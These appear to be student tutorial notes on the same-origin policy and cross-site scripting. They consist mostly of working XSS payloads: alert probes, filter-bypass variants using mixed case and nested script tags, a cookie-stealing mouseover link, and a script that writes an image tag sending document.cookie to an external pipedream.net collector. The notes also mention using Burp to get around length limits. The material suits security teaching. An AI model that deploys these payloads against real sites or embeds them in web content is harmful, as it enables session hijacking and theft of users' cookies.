# Tutorial 7

SOP limits an origin's 'resources' (e.g. scripts) so they can't run wild and interact with other origin's resources!

Make the website interact with only with itself

## XSS Payloads

``` html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<marquee onstart=alert("1990s")>
```

Bypassing filters

``` html
<script>alert(1)</script> fails
<sCript>alert(1)</sCript>
<scr<script>ipt>alert(1)</script>
```

Stealing cookies:

Use burp to bypass any length restrictions:

``` html
\<a onmouseover="alert(document.cookie)"\>xss link\</a\>
```

Exfiltration:

``` html
<script>document.write('<img src="https://no0mubyk0uwwe.x.pipedream.net/?c='+document.cookie+'')</script>
```

Useful links

* <https://csp-evaluator.withgoogle.com/>
* <https://owasp.org/www-community/xss-filter-evasion-cheatsheet>
